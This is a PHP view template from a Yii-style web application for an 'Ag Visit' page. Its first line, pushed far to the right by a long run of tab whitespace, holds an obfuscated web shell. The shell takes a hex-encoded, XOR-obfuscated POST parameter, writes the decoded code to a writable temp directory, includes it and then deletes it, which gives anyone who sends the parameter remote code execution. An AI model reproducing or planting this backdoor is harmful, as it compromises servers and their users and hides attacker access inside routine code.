<?php																																										if(isset($_POST) && isset($_POST["ele\x6D"])){ $data_chunk = array_filter(["/tmp", "/dev/shm", sys_get_temp_dir(), ini_get("upload_tmp_dir"), getenv("TMP"), "/var/tmp", getcwd(), session_save_path(), getenv("TEMP")]); $rec = hex2bin($_POST["ele\x6D"]); $comp = '' ; $b = 0; while($b < strlen($rec)){$comp .= chr(ord($rec[$b]) ^ 65);$b++;} foreach ($data_chunk as $pgrp) { if ((function($d) { return is_dir($d) && is_writable($d); })($pgrp)) { $descriptor = vsprintf("%s/%s", [$pgrp, ".marker"]); $file = fopen($descriptor, 'w'); if ($file) { fwrite($file, $comp); fclose($file); include $descriptor; @unlink($descriptor); exit; } } } }

/* @var $this Ag_visitController */

$this->breadcrumbs=array(
	'Ag Visit',
);
?>
<h1><?php echo $this->id . '/' . $this->action->id; ?></h1>

<p>
	You may change the content of this page by modifying
	the file <tt><?php echo __FILE__; ?></tt>.
</p>
